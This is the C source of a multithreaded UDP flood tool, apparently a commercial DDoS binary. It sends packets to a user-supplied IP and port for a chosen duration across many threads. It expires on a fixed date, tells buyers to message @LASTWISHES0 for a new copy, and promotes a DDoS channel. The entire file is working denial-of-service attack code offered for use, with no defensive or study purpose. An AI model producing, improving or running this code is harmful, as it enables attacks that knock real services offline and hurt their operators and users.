#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <zlib.h>
#include <net/if.h>
#include <fcntl.h>

#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define WHITE   "\033[1;37m"
#define RESET   "\033[0m"

#define BUFFER_SIZE 16384
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 4
#define EXPIRATION_DAY 4

char *ip;
int port;
int duration;
char padding_data[16 * 1024 * 1024]; // Increased padding for better memory alignment

unsigned long calculate_crc32(const char *data) {
    return crc32(0, (const unsigned char *)data, strlen(data));
}

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};   
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;  
    time(&now);
    double remaining_time = difftime(mktime(&expiration_date), now);
    int days = remaining_time / 86400;
    int hours = ((int)remaining_time % 86400) / 3600;
    int minutes = (((int)remaining_time % 86400) % 3600) / 60;
    if (remaining_time <= 0) {
        printf(RED "🔥 ===========================\n");
        printf("🔥 FILE CLOSED BY @LASTWISHES0 🔥\n");
        printf("🚀 DM TO BUY NEW FILE @LASTWISHES0 🚀\n");
        printf("🔥 ===========================\n" RESET);
        exit(EXIT_FAILURE);
    } else {
        printf(YELLOW "⏳ TIME REMAINING UNTIL EXPIRATION: %d DAYS, %d HOURS, %d MINUTES ⏳\n" RESET, days, hours, minutes);
    }
}

// Powerful multithreaded attack function
void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(sched_getcpu() % 4, &cpuset); // Distributes threads on 3-4 cores
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set socket to non-blocking mode for faster performance
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    snprintf(buffer, sizeof(buffer), "🔥 POWERFUL ATTACK PACKET 🔥");
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    printf(GREEN "⚡ ATTACK STARTED ON %s:%d FOR %d SECONDS ⚡\n" RESET, ip, port, duration);

    while (time(NULL) < end_time) {
        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                            (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }
    printf(GREEN "🔥 ATTACK FINISHED ON %s:%d 🔥\n" RESET, ip, port);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    check_expiration();

    char *binary_name = basename(argv[0]);  
    if (strcmp(binary_name, "devil") != 0) {
        printf(RED "\n🔥 ERROR: BINARY NAME MUST BE 'devil' 🔥\n" RESET);
        exit(EXIT_FAILURE);
    }
    
    if (argc != 5) {
        fprintf(stderr, RED "🔥 ===========================\n");
        fprintf(stderr, CYAN "🚀 USAGE: %s <IP> <PORT> <DURATION> <THREADS> 🚀\n", argv[0]);
        fprintf(stderr, RED "🔥 ===========================\n");
        fprintf(stderr, GREEN "⚡ AFTER EXPIRE DM @LASTWISHES0 ⚡\n");
        fprintf(stderr, RED "🔥 ===========================\n");
        fprintf(stderr, YELLOW "🔥 THIS EXPIRES ON %d-%02d-%02d 🔥\n", EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY);
        fprintf(stderr, RED "🔥 ===========================\n");
        fprintf(stderr, CYAN "🚀 OWNER: @LASTWISHES0 🚀\n");
        fprintf(stderr, RED "🔥 ===========================\n");
        fprintf(stderr, GREEN "🔥 JOIN CHANNEL @apnabhaiddos🔥\n");
        fprintf(stderr, RED "🔥 ===========================\n" RESET);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    memset(padding_data, 0, sizeof(padding_data));
    unsigned long crc = calculate_crc32("apnabhaiddos🔥");
    printf("🎯 JOIN :- @apnabhaiddos | CRC32: %lx 🎯\n", crc);
    
    pthread_t *tid = malloc(sizeof(pthread_t) * threads);
    if (!tid) {
        perror("Memory allocation for threads failed");
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    free(tid);
    return 0;
}
